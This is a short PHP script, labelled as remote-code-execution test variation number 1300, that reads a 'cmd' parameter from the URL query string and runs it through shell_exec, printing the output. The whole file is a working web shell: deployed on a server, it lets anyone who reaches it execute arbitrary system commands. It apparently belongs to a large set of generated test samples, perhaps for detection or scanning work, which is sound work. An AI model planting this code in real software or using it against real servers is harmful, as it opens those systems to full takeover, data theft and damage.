<?php
// RCE test variation #1300
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>